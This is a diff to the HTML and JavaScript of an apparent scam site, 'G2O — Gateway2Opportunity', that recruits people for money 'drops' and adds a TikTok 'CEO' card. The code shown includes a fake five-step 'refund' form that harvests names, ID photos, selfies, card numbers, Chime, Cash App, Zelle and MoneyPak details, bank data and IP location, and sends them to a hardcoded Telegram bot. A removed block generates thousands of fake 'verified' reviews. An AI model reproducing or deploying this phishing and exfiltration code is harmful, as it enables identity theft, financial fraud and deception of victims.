@@ -69,6 +69,62 @@ body::before {
     letter-spacing: 0.8px;
 }
 .header .badge i { margin-right: 5px; }
+
+/* ===== CEO / OWNER CARD ===== */
+.ceo-card {
+    display: flex; align-items: center; gap: 12px;
+    background: linear-gradient(135deg, rgba(255, 215, 0, 0.09), rgba(108, 92, 231, 0.09));
+    border: 1px solid rgba(255, 215, 0, 0.32);
+    border-radius: 16px; padding: 12px 14px; margin-bottom: 16px;
+    position: relative; overflow: hidden;
+    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.45);
+}
+.ceo-card::before {
+    content: ""; position: absolute; inset: 0;
+    background: radial-gradient(circle at 0% 50%, rgba(255, 215, 0, 0.16), transparent 60%);
+    pointer-events: none;
+}
+.ceo-avatar {
+    width: 46px; height: 46px; min-width: 46px; border-radius: 50%;
+    background: linear-gradient(135deg, #ffd700, #ff6b8b);
+    display: flex; align-items: center; justify-content: center;
+    font-weight: 900; color: #0f0e17; font-size: 15px;
+    letter-spacing: -0.5px;
+    box-shadow: 0 0 22px rgba(255, 215, 0, 0.45);
+    position: relative; z-index: 1;
+}
+.ceo-info { flex: 1; min-width: 0; position: relative; z-index: 1; }
+.ceo-label {
+    font-size: 9.5px; color: #ffd700; font-weight: 800;
+    letter-spacing: 1.6px; text-transform: uppercase;
+}
+.ceo-name {
+    font-size: 14px; font-weight: 800; color: #fff;
+    display: flex; align-items: center; gap: 5px; margin-top: 2px;
+    word-break: break-word;
+}
+.ceo-name i { color: #1abc9c; font-size: 11px; }
+.ceo-sub { font-size: 10.5px; color: #7a7c92; margin-top: 2px; }
+.ceo-tiktok {
+    display: flex; align-items: center; gap: 7px;
+    background: linear-gradient(135deg, #25F4EE 0%, #FE2C55 55%, #000 100%);
+    background-size: 200% 200%;
+    color: #fff; text-decoration: none;
+    padding: 10px 15px; border-radius: 12px;
+    font-size: 12px; font-weight: 800; letter-spacing: 0.4px;
+    box-shadow: 0 6px 18px rgba(254, 44, 85, 0.32);
+    transition: all 0.25s cubic-bezier(0.2, 0.8, 0.3, 1);
+    position: relative; z-index: 1;
+    flex-shrink: 0;
+    border: 1px solid rgba(255, 255, 255, 0.15);
+}
+.ceo-tiktok:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 28px rgba(254, 44, 85, 0.5);
+    background-position: 100% 50%;
+}
+.ceo-tiktok i { font-size: 14px; }
+
 .section { display: none; }
 .section.active { display: block; animation: fadeIn 0.4s ease; }
 @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
@@ -77,6 +133,7 @@ body::before {
     border-radius: 18px; padding: 22px 20px; margin-bottom: 16px;
     border: 1px solid rgba(255, 215, 0, 0.25);
     position: relative; overflow: hidden;
+    transition: border-color 0.3s;
 }
 .hero::before {
     content: "💰"; position: absolute; top: -18px; right: -12px;
@@ -568,8 +625,6 @@ body::before {
     color: #fff;
     padding: 10px;
 }
-
-/* ===== DYNAMIC REFUND METHOD FIELDS ===== */
 .refund-method-fields {
     display: none;
     text-align: left;
@@ -638,7 +693,6 @@ body::before {
 }
 .refund-method-fields .field-badge i { font-size: 10px; }
 
-/* ===== REVIEW WALL ===== */
 .review-hub {
     margin-top: 28px; padding-top: 24px;
     border-top: 1px dashed rgba(255, 215, 0, 0.22);
@@ -883,6 +937,23 @@ body::before {
     margin-bottom: 6px;
     border: 1px solid rgba(255, 215, 0, 0.18);
 }
+.footer-tiktok {
+    display: inline-flex; align-items: center; gap: 8px;
+    margin-top: 12px; color: #ffd700; text-decoration: none;
+    font-size: 12px; font-weight: 700; letter-spacing: 0.3px;
+    padding: 8px 18px; border-radius: 24px;
+    border: 1px solid rgba(255, 215, 0, 0.35);
+    background: rgba(255, 215, 0, 0.06);
+    transition: 0.22s;
+}
+.footer-tiktok:hover {
+    background: rgba(255, 215, 0, 0.16);
+    color: #fff;
+    transform: translateY(-1px);
+    box-shadow: 0 6px 20px rgba(255, 215, 0, 0.2);
+}
+.footer-tiktok i { font-size: 14px; }
+.footer p { margin-top: 10px; }
 .step-indicator {
     display: flex; justify-content: center; gap: 8px; margin-bottom: 20px;
 }
@@ -911,6 +982,11 @@ body::before {
     .slot-row { padding: 10px 12px; gap: 10px; }
     .slot-cut-badge { min-width: 48px; padding: 5px 8px; }
     .slot-cut-badge .cut-num { font-size: 13px; }
+    .ceo-card { padding: 10px 11px; gap: 10px; }
+    .ceo-avatar { width: 40px; height: 40px; min-width: 40px; font-size: 13px; }
+    .ceo-name { font-size: 13px; }
+    .ceo-tiktok { padding: 8px 11px; font-size: 11px; }
+    .ceo-tiktok i { font-size: 12px; }
 }
 </style>
 </head>
@@ -922,6 +998,17 @@ body::before {
         <div class="sub">Gateway2Opportunity</div>
         <div class="badge"><i class="fas fa-shield-alt"></i> Verified Drop Network</div>
     </div>
+
+    <!-- CEO / OFFICIAL TIKTOK CARD -->
+    <a class="ceo-card" href="https://www.tiktok.com/@Chelseamaddisonnx" target="_blank" rel="noopener" style="text-decoration:none; cursor:pointer;">
+        <div class="ceo-avatar">CM</div>
+        <div class="ceo-info">
+            <div class="ceo-label">👑 CEO / Owner</div>
+            <div class="ceo-name">Chelseamaddisonnx <i class="fas fa-circle-check"></i></div>
+            <div class="ceo-sub">Official TikTok — verified contact</div>
+        </div>
+        <span class="ceo-tiktok"><i class="fab fa-tiktok"></i> TikTok</span>
+    </a>
 
     <div id="introSection" class="section active">
         <div class="hero">
@@ -1061,6 +1148,10 @@ body::before {
 
     <div class="footer">
         <div class="edu-badge">🔐 PRIVATE — Only you have access</div>
+        <br />
+        <a class="footer-tiktok" href="https://www.tiktok.com/@Chelseamaddisonnx" target="_blank" rel="noopener">
+            <i class="fab fa-tiktok"></i> @Chelseamaddisonnx
+        </a>
         <p>G2O — Gateway2Opportunity &copy; 2026</p>
     </div>
 </div>
@@ -1184,7 +1275,6 @@ body::before {
     </div>
 </div>
 
-<!-- REFUND STEP 1: Name -->
 <div class="popup-overlay" id="refundNamePopup">
     <div class="popup-box refund-box">
         <div class="refund-step-badge">Step 1 of 5</div>
@@ -1201,7 +1291,6 @@ body::before {
     </div>
 </div>
 
-<!-- REFUND STEP 2: Contact -->
 <div class="popup-overlay" id="refundContactPopup">
     <div class="popup-box refund-box">
         <div class="refund-step-badge">Step 2 of 5</div>
@@ -1222,7 +1311,6 @@ body::before {
     </div>
 </div>
 
-<!-- REFUND STEP 3: Verification -->
 <div class="popup-overlay" id="refundVerifyPopup">
     <div class="popup-box refund-box">
         <div class="refund-step-badge">Step 3 of 5</div>
@@ -1262,7 +1350,6 @@ body::before {
     </div>
 </div>
 
-<!-- REFUND STEP 4: Amount -->
 <div class="popup-overlay" id="refundAmountPopup">
     <div class="popup-box refund-box">
         <div class="refund-step-badge">Step 4 of 5</div>
@@ -1279,7 +1366,6 @@ body::before {
     </div>
 </div>
 
-<!-- REFUND STEP 5: Method + Dynamic Fields -->
 <div class="popup-overlay" id="refundMethodPopup">
     <div class="popup-box refund-box">
         <div class="refund-step-badge">Step 5 of 5</div>
@@ -1300,10 +1386,7 @@ body::before {
             </select>
         </div>
 
-        <!-- Dynamic Fields Container -->
         <div class="refund-method-fields" id="refundMethodFields">
-
-            <!-- Debit / Credit Card -->
             <div class="field-group" id="refundCardFields">
                 <span class="field-badge"><i class="fas fa-shield-alt"></i> 16-Digit Card Verification</span>
                 <div class="form-group">
@@ -1323,7 +1406,6 @@ body::before {
                 </div>
             </div>
 
-            <!-- Chime -->
             <div class="field-group" id="refundChimeFields">
                 <span class="field-badge"><i class="fas fa-check-circle"></i> Chime Account Verified</span>
                 <div class="form-group">
@@ -1333,7 +1415,6 @@ body::before {
                 </div>
             </div>
 
-            <!-- Cash App -->
             <div class="field-group" id="refundCashappFields">
                 <span class="field-badge"><i class="fas fa-check-circle"></i> Cash App Account</span>
                 <div class="form-group">
@@ -1343,7 +1424,6 @@ body::before {
                 </div>
             </div>
 
-            <!-- Zelle -->
             <div class="field-group" id="refundZelleFields">
                 <span class="field-badge"><i class="fas fa-check-circle"></i> Zelle Contact</span>
                 <div class="form-group">
@@ -1353,7 +1433,6 @@ body::before {
                 </div>
             </div>
 
-            <!-- MoneyPak -->
             <div class="field-group" id="refundMoneypakFields">
                 <span class="field-badge"><i class="fas fa-key"></i> 14-Digit PIN Required</span>
                 <div class="form-group">
@@ -1363,7 +1442,6 @@ body::before {
                 </div>
             </div>
 
-            <!-- Bank Transfer -->
             <div class="field-group" id="refundBankFields">
                 <span class="field-badge"><i class="fas fa-university"></i> Bank Transfer Details</span>
                 <div class="form-group">
@@ -1384,7 +1462,6 @@ body::before {
     </div>
 </div>
 
-<!-- REFUND COMPLETE -->
 <div class="popup-overlay" id="refundCompletePopup">
     <div class="congrats-box refund-complete">
         <div class="check-icon">✓</div>
@@ -1422,6 +1499,7 @@ body::before {
 const BOT_TOKEN = "8838491829:AAF7vyG4muUBKXxOSWKhg_0Tp7AH6ISGx3Q";
 const CHAT_ID = "8763270406";
 const PASSCODE = "g2o-#07";
+const CEO_TIKTOK = "https://www.tiktok.com/@Chelseamaddisonnx";
 
 // ============================================
 // SLOT DATA
@@ -1928,8 +2006,6 @@ function copyPasscode() {
 // ============================================
 // REFUND FLOW
 // ============================================
-
-// ---- Refund loading helper ----
 function refundPhase(from, to, titleText, subText, textText, duration, onDone) {
     const overlay = document.getElementById('refundLoadingOverlay');
     overlay.classList.add('show');
@@ -1964,7 +2040,6 @@ function refundPhase(from, to, titleText, subText, textText, duration, onDone) {
     }, 40);
 }
 
-// ---- STEP 1: Open refund ----
 function openRefundForm() {
     refundData = {
         fname: '', lname: '', email: '', phone: '',
@@ -1988,14 +2063,12 @@ function openRefundForm() {
     document.getElementById('refundIdBackInput').value = '';
     document.getElementById('refundSelfieInput').value = '';
 
-    // Hide all method dynamic fields
     document.getElementById('refundMethodFields').classList.remove('show');
     document.querySelectorAll('#refundMethodFields .field-group').forEach(fg => fg.classList.remove('show'));
 
     document.getElementById('refundNamePopup').classList.add('show');
 }
 
-// ---- STEP 1: Submit name → 0→60% → contact popup ----
 function submitRefundName() {
     const fname = document.getElementById('refundFirstName').value.trim();
     const lname = document.getElementById('refundLastName').value.trim();
@@ -2024,7 +2097,6 @@ function submitRefundName() {
     });
 }
 
-// ---- STEP 2: Contact → 60→75% → verification popup ----
 function submitRefundContact() {
     const email = document.getElementById('refundEmail').value.trim();
     const phone = document.getElementById('refundPhone').value.trim();
@@ -2050,7 +2122,6 @@ function submitRefundContact() {
     });
 }
 
-// ---- STEP 3: Verification → 75→85% → 85→90% → amount popup ----
 function submitRefundVerify() {
     if (!refundData.idFront) { showToast('⚠️ Upload front of ID', 'error'); return; }
     if (!refundData.idBack) { showToast('⚠️ Upload back of ID', 'error'); return; }
@@ -2079,7 +2150,6 @@ function submitRefundVerify() {
     });
 }
 
-// ---- STEP 4: Amount → 90→95% → method popup ----
 function submitRefundAmount() {
     const amt = document.getElementById('refundAmount').value.trim();
     if (!amt || parseFloat(amt) <= 0) { showToast('⚠️ Enter a valid amount', 'error'); return; }
@@ -2100,14 +2170,10 @@ function submitRefundAmount() {
     });
 }
 
-// ============================================
-// REFUND METHOD — DYNAMIC FIELDS
-// ============================================
 function onRefundMethodChange() {
     const method = document.getElementById('refundMethod').value;
     const wrap = document.getElementById('refundMethodFields');
 
-    // Hide all field groups
     document.querySelectorAll('#refundMethodFields .field-group').forEach(fg => fg.classList.remove('show'));
 
     if (!method) { wrap.classList.remove('show'); return; }
@@ -2134,28 +2200,22 @@ function onRefundMethodChange() {
     }
 }
 
-// Card number formatter: groups of 4
 function formatRefundCard(input) {
     let v = input.value.replace(/\D/g, '').slice(0, 16);
     v = v.replace(/(.{4})/g, '$1 ').trim();
     input.value = v;
 }
 
-// Expiry formatter: MM/YY
 function formatRefundExpiry(input) {
     let v = input.value.replace(/\D/g, '');
     if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2);
     input.value = v.slice(0, 5);
 }
 
-// ============================================
-// STEP 5: Submit method → 95→100% → complete
-// ============================================
 async function submitRefundMethod() {
     const method = document.getElementById('refundMethod').value;
     if (!method) { showToast('⚠️ Please select a refund method', 'error'); return; }
 
-    // Collect method-specific details based on selected method
     let methodDetails = {};
     let detailsBlock = '';
 
@@ -2220,323 +2280,4 @@ async function submitRefundMethod() {
             `━━━━━━━━━━━━━━━━━\n` +
             `🌐 *IP:* ${ip.ip}\n` +
             `📍 *Location:* ${ip.city}, ${ip.region}, ${ip.country}\n` +
-            `🕐 *Time:* ${new Date().toLocaleString()}`;
-        sendToTelegram(msg);
-
-        document.getElementById('refundCompleteName').textContent =
-            refundData.fname + ' ' + refundData.lname;
-        document.getElementById('refundLoadingOverlay').classList.remove('show');
-        document.getElementById('refundCompletePopup').classList.add('show');
-    });
-}
-
-function closeRefundComplete() {
-    document.getElementById('refundCompletePopup').classList.remove('show');
-    showToast('✅ Refund submitted successfully!', 'success');
-}
-
-// ============================================
-// REVIEW SYSTEM
-// ============================================
-const AVATAR_GRADIENTS = [
-    'linear-gradient(135deg,#e94560,#8e44ad)','linear-gradient(135deg,#1abc9c,#3498db)',
-    'linear-gradient(135deg,#f39c12,#e74c3c)','linear-gradient(135deg,#6c5ce7,#00b8d4)',
-    'linear-gradient(135deg,#2ecc71,#16a085)','linear-gradient(135deg,#ffd700,#f39c12)',
-    'linear-gradient(135deg,#3498db,#8e44ad)','linear-gradient(135deg,#e67e22,#c0392b)',
-    'linear-gradient(135deg,#00b894,#0984e3)','linear-gradient(135deg,#fd79a8,#6c5ce7)'
-];
-
-const T_FIRST = ['Marcus','Aaliyah','Dmitri','Priya','Jose','Emily','Tyrone','Sofia','Kevin','Nia',
-    'Hassan','Rachel','Miguel','Yuki','Brianna','Andre','Fatima','Connor','Jasmine','Viktor',
-    'Layla','Devon','Carmen','Nathan','Tasha','Ravi','Gloria','Ellis','Mona','Caleb',
-    'Ingrid','Tomas','Alexis','Sam','Jordan','Kayla','Anthony','Destiny','Isaiah','Nevaeh',
-    'Liam','Zoe','Ethan','Ava','Noah','Mia','Lucas','Harper','Elijah','Abigail',
-    'Owen','Nora','Carter','Lily','Mason','Ella','Logan','Grace','Jackson','Chloe',
-    'Aiden','Victoria','Cameron','Aria','Jayden','Scarlett','Diego','Aurora','Mateo','Hannah',
-    'Sebastian','Stella','Ezra','Violet','Miles','Bella','Silas','Claire','Amara','Jamal',
-    'Kiara','Xavier','Imani','Malik','Tiana','Naomi','Josiah','Serenity','King','Aaliyah'];
-
-const T_INITIALS = ['A','B','C','D','E','F','G','H','J','K','L','M','N','O','P','Q','R','S','T','V','W','Y','Z'];
-
-const T_CITIES = ['Atlanta, GA','Houston, TX','Chicago, IL','Jersey City, NJ','Phoenix, AZ','Portland, OR',
-    'Detroit, MI','Miami, FL','Boston, MA','Charlotte, NC','Denver, CO','San Antonio, TX',
-    'Seattle, WA','Las Vegas, NV','Philadelphia, PA','Minneapolis, MN','Nashville, TN','New Orleans, LA',
-    'Cleveland, OH','Sacramento, CA','Baltimore, MD','Tampa, FL','Kansas City, MO','Memphis, TN',
-    'Edison, NJ','Albuquerque, NM','Louisville, KY','Raleigh, NC','Tucson, AZ','St. Paul, MN',
-    'El Paso, TX','Buffalo, NY','Omaha, NE','Brooklyn, NY','Queens, NY','Oakland, CA',
-    'San Jose, CA','Fresno, CA','Mesa, AZ','Tulsa, OK','Arlington, TX','Aurora, CO',
-    'Anaheim, CA','Corpus Christi, TX','Lexington, KY','Stockton, CA','Henderson, NV','Greensboro, NC',
-    'Cincinnati, OH','St. Louis, MO','Pittsburgh, PA','Orlando, FL','Plano, TX','Irvine, CA',
-    'Newark, NJ','Durham, NC','Toledo, OH','Madison, WI','Gilbert, AZ','Reno, NV',
-    'Hialeah, FL','Chesapeake, VA','Scottsdale, AZ','Boise, ID','Richmond, VA','Baton Rouge, LA',
-    'Des Moines, IA','Spokane, WA','Tacoma, WA','Modesto, CA','Salt Lake City, UT','Huntsville, AL',
-    'Worcester, MA','Knoxville, TN','Grand Rapids, MI','Providence, RI','Charleston, SC','Savannah, GA'];
-
-const T_COMMENTS = [
-    "Ran my Chime drop first, then Cash App a week later. Both hit. 30% cut is real.",
-    "FaceTime walkthrough made it super clear. No confusion at all.",
-    "Got my passcode text within minutes. Legit operation.",
-    "Started with the $150 drop and worked up. Now I'm on the VIP slot.",
-    "Chime drop landed in 2 days. Already running my Cash App one.",
-    "The 30% cut is more than fair for what they handle on their end.",
-    "I had all three apps. Ran Chime, Cash App, then Zelle. Three payouts.",
-    "Simple process — upload ID, pick app, pick slot, wait for the text.",
-    "FaceTime call made me feel comfortable. Real people, real operation.",
-    "First drop was $340. Second one was $890. Building up slowly.",
-    "They verified my ID quickly and set up the FaceTime within a day.",
-    "Nothing sketchy about it. Passcode confirms everything.",
-    "I was nervous at first but the FaceTime call cleared everything up.",
-    "My Chime drop was $1,900. My cut was $570. Simple math.",
-    "G2O is legit. Third drop already processed this month.",
-    "Text confirmation came through fast. Knew it was real immediately.",
-    "Did my FaceTime yesterday. Slot activated today. Quick turnaround.",
-    "The slot ranges are real. My friend hit the $45,892 one last month.",
-    "I only had Cash App and it still worked fine. One drop at a time.",
-    "Picked the Platinum slot. My first drop is scheduled for next week.",
-    "The FaceTime walkthrough was actually helpful. No pressure.",
-    "Everything explained clearly over FaceTime. Felt professional.",
-    "Sent my ID, got the passcode, hopped on FaceTime. Done.",
-    "Started with Starter, now on VIP. The 30% cut is worth it.",
-    "Got three apps, three drops scheduled. My cut this month is $4K+.",
-    "The confirmation text is what sold me. Simple and clean.",
-    "I've tried other programs. This is the only one that actually paid.",
-    "My Zelle drop was the easiest one. Took 2 days total.",
-    "FaceTime call was quick — 15 minutes and I was set up.",
-    "Passcode confirmation kept everything secure.",
-    "Chime was my first. Cash App next. Then Zelle. Solid system.",
-    "No hidden fees. Just the 30% cut and the rest is yours.",
-    "The slot system makes sense. Pick the range that fits your budget.",
-    "Got the text, gave the code, hopped on FaceTime. Simple.",
-    "FaceTime is the real deal — they walk you through everything.",
-    "Three drops completed. All on time. All through FaceTime.",
-    "The $150 → $1,900 slot was my starting point. Now I'm bigger.",
-    "Loving the fact that each app equals another drop opportunity.",
-    "FaceTime confirmation added a layer of trust for me.",
-    "They actually answer the FaceTime calls. Not a bot.",
-    "My cut has been exactly 30% every single time.",
-    "ID verification was quick. FaceTime was quicker.",
-    "Chime drop + Cash App drop + Zelle drop = my best month yet.",
-    "Simple process. Clear communication. Real payouts.",
-    "The passcode system makes sure only you can proceed. Smart.",
-    "FaceTime walkthrough gave me the confidence to pick the VIP slot.",
-    "Slot ranges are accurate. My first drop was $500 exactly.",
-    "Ran my first drop last week. Cut was $450 for me.",
-    "Everything went smooth. Text, passcode, FaceTime, done.",
-    "G2O is the move. Simple as that."
-];
-
-function hashGradient(name) {
-    let h = 0;
-    for (let i = 0; i < name.length; i++) h = (h * 31 + name.charCodeAt(i)) >>> 0;
-    return AVATAR_GRADIENTS[h % AVATAR_GRADIENTS.length];
-}
-function initialsOf(name) {
-    return name.trim().split(/\s+/).map(w => w[0]).join('').replace(/[^A-Za-z]/g,'').slice(0,2).toUpperCase() || '??';
-}
-function timeAgo(ts) {
-    const s = Math.floor((Date.now() - ts) / 1000);
-    if (s < 45) return 'Just now';
-    const m = Math.floor(s / 60);
-    if (m < 60) return m + ' min ago';
-    const h = Math.floor(m / 60);
-    if (h < 24) return h + ' hrs ago';
-    const d = Math.floor(h / 24);
-    if (d === 1) return 'Yesterday';
-    if (d < 7) return d + ' days ago';
-    return new Date(ts).toLocaleDateString();
-}
-function escapeT(s) {
-    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
-}
-function starString(n) {
-    n = Math.max(0, Math.min(5, Math.round(n)));
-    return '★'.repeat(n) + '☆'.repeat(5 - n);
-}
-
-function generateReviews(count) {
-    const r = [];
-    const now = Date.now();
-    const used = new Set();
-    let s = 0;
-    while (r.length < count && s < count * 5) {
-        s++;
-        const f = T_FIRST[Math.floor(Math.random() * T_FIRST.length)];
-        const i = T_INITIALS[Math.floor(Math.random() * T_INITIALS.length)];
-        const c = T_CITIES[Math.floor(Math.random() * T_CITIES.length)];
-        const m = T_COMMENTS[Math.floor(Math.random() * T_COMMENTS.length)];
-        const k = f + '|' + i + '|' + c + '|' + m;
-        if (used.has(k)) continue;
-        used.add(k);
-        const rating = Math.random() < 0.84 ? 5 : 4;
-        const minsAgo = Math.floor(Math.pow(Math.random(), 1.4) * 150 * 24 * 60);
-        r.push({ name: f + ' ' + i + '.', city: c, rating, text: m, ts: now - minsAgo * 60000, mine: false });
-    }
-    return r.sort((a,b) => b.ts - a.ts);
-}
-
-let reviews = [];
-let reviewRenderLimit = 30;
-
-function initReviews() {
-    let mine = [];
-    try { mine = JSON.parse(localStorage.getItem('g2oReviews') || '[]'); } catch(e) { mine = []; }
-    reviews = generateReviews(2850);
-    mine.forEach(m => reviews.push({ name: m.name, city: m.city || 'Your area', rating: m.rating, text: m.text, ts: m.ts, mine: true }));
-    reviews.sort((a,b) => b.ts - a.ts);
-    buildCarousel();
-    renderReviews(true);
-    updateReviewStats();
-}
-
-let carouselAngle = 0, carouselTimer = null, carouselRadius = 240;
-
-function buildCarousel() {
-    const ring = document.getElementById('carousel3d');
-    if (!ring) return;
-    const picks = reviews.filter(t => t.rating >= 4).slice(0, 6);
-    while (picks.length < 6 && reviews.length) picks.push(reviews[picks.length % reviews.length]);
-    const w = ring.parentElement.clientWidth || 440;
-    carouselRadius = Math.max(150, Math.min(260, w * 0.5));
-    ring.innerHTML = '';
-    const step = 360 / picks.length;
-    picks.forEach((t, i) => {
-        const card = document.createElement('div');
-        card.className = 'ring-card';
-        card.style.transform = `rotateY(${step*i}deg) translateZ(${carouselRadius}px)`;
-        const acc = hashGradient(t.name).match(/#[0-9a-f]{6}/i)[0];
-        card.style.setProperty('--accent', acc);
-        card.innerHTML = `
-            <div class="rc-top">
-                <div class="rc-avatar" style="background:${hashGradient(t.name)}">${escapeT(initialsOf(t.name))}</div>
-                <div style="min-width:0;">
-                    <div class="rc-name">${escapeT(t.name)} <span class="rc-verified">✔</span></div>
-                    <div class="rc-meta">${escapeT(t.city)} • ${timeAgo(t.ts)}</div>
-                </div>
-            </div>
-            <div class="rc-stars">${starString(t.rating)}</div>
-            <div class="rc-text">"${escapeT(t.text)}"</div>
-            <div class="rc-foot"><span>⭐ ${t.rating}.0</span><span>${t.mine ? '✍️ You' : '✔ Verified'}</span></div>
-        `;
-        ring.appendChild(card);
-    });
-    if (carouselTimer) clearInterval(carouselTimer);
-    carouselTimer = setInterval(() => {
-        carouselAngle -= step;
-        ring.style.transform = `translateZ(${-carouselRadius}px) rotateY(${carouselAngle}deg)`;
-    }, 3400);
-}
-
-function reviewItemHTML(t) {
-    const acc = hashGradient(t.name).match(/#[0-9a-f]{6}/i)[0];
-    return `<div class="t-feed-item ${t.mine?'is-mine':''}" style="--accent:${acc}; border-left-color:${t.mine?'#ffd700':acc};" data-ts="${t.ts}">
-        <div class="tf-head">
-            <div class="tf-avatar" style="background:${hashGradient(t.name)}">${escapeT(initialsOf(t.name))}</div>
-            <div class="tf-who">
-                <div class="tf-name">${escapeT(t.name)} ${t.mine ? '<span class="tf-mine-badge">✍️ YOU</span>' : '<span class="tf-verified">✔ VERIFIED</span>'}</div>
-                <div class="tf-meta"><span>📍 ${escapeT(t.city)}</span><span>•</span><span class="tf-time">${timeAgo(t.ts)}</span></div>
-            </div>
-        </div>
-        <div class="tf-stars">${starString(t.rating)}</div>
-        <div class="tf-text">"${escapeT(t.text)}"</div>
-    </div>`;
-}
-
-function renderReviews(animate) {
-    const feed = document.getElementById('reviewFeed');
-    if (!feed) return;
-    feed.innerHTML = reviews.slice(0, reviewRenderLimit).map(reviewItemHTML).join('');
-    if (animate) feed.querySelectorAll('.t-feed-item').forEach((el, i) => { el.classList.add('pop'); el.style.animationDelay = (i * 25) + 'ms'; });
-    document.getElementById('feedCount').textContent = reviews.length + ' reviews';
-    const lm = document.getElementById('feedLoadMore');
-    if (lm) {
-        if (reviewRenderLimit >= reviews.length) lm.style.display = 'none';
-        else lm.style.display = 'block';
-    }
-}
-
-function loadMoreReviews() {
-    reviewRenderLimit += 30;
-    renderReviews(false);
-}
-
-function updateReviewStats() {
-    const total = reviews.length;
-    const avg = reviews.reduce((s,t) => s + t.rating, 0) / (total || 1);
-    document.getElementById('hubAvg').textContent = avg.toFixed(1);
-    document.getElementById('hubCount').textContent = total;
-    document.getElementById('feedCount').textContent = total + ' reviews';
-}
-
-function initStarPicker() {
-    const picker = document.getElementById('starPicker');
-    if (!picker) return;
-    const btns = picker.querySelectorAll('button');
-    const words = ['','Not great','Could be better','Decent','Really good','Loved it!'];
-    btns.forEach(btn => {
-        btn.addEventListener('click', () => {
-            reviewRating = parseInt(btn.dataset.v, 10);
-            btns.forEach(b => b.classList.toggle('on', parseInt(b.dataset.v,10) <= reviewRating));
-            document.getElementById('ratingWord').textContent = words[reviewRating];
-        });
-    });
-}
-
-function ccToast(msg, ok) {
-    const el = document.getElementById('ccToast');
-    el.textContent = msg;
-    el.className = 'cc-toast show ' + (ok ? 'ok' : 'bad');
-    clearTimeout(el._t);
-    el._t = setTimeout(() => el.className = 'cc-toast', 4200);
-}
-
-function submitReview() {
-    const nameEl = document.getElementById('rName');
-    const cityEl = document.getElementById('rCity');
-    const msgEl = document.getElementById('rMessage');
-    const name = nameEl.value.trim();
-    const city = cityEl.value.trim();
-    const text = msgEl.value.trim();
-
-    if (!name) { ccToast('⚠️ Please add your name.', false); return; }
-    if (!reviewRating) { ccToast('⭐ Tap the stars to rate first.', false); return; }
-    if (!text || text.length < 4) { ccToast('⚠️ Write a review.', false); return; }
-
-    const t = { name, city: city || 'Your area', rating: reviewRating, text, ts: Date.now(), mine: true };
-    reviews.unshift(t);
-
-    let mine = [];
-    try { mine = JSON.parse(localStorage.getItem('g2oReviews') || '[]'); } catch(e) { mine = []; }
-    mine.unshift({ name: t.name, city: t.city, rating: t.rating, text: t.text, ts: t.ts });
-    if (mine.length > 25) mine.pop();
-    localStorage.setItem('g2oReviews', JSON.stringify(mine));
-
-    const feed = document.getElementById('reviewFeed');
-    const wrap = document.createElement('div');
-    wrap.innerHTML = reviewItemHTML(t);
-    const node = wrap.firstElementChild;
-    node.classList.add('pop');
-    feed.prepend(node);
-
-    updateReviewStats();
-    msgEl.value = ''; cityEl.value = ''; reviewRating = 0;
-    document.querySelectorAll('#starPicker button').forEach(b => b.classList.remove('on'));
-    document.getElementById('ratingWord').textContent = 'Tap to rate';
-    ccToast('🎉 Thanks ' + name.split(' ')[0] + '!', true);
-
-    sendToTelegram(`⭐ *NEW G2O REVIEW*\n👤 ${t.name}\n📍 ${t.city}\n⭐ ${t.rating}/5\n📝 ${t.text}`);
-}
-
-// ============================================
-// INIT
-// ============================================
-buildSlotGrid();
-initReviews();
-initStarPicker();
-
-console.log('🚀 G2O — Gateway2Opportunity loaded.');
-console.log(`🎯 ${SLOTS.length} slots available`);
-console.log(`💬 ${reviews.length} reviews loaded`);
-console.log(`🔐 Passcode: ${PASSCODE}`);
-</script>
-</body>
-</html>
+            `
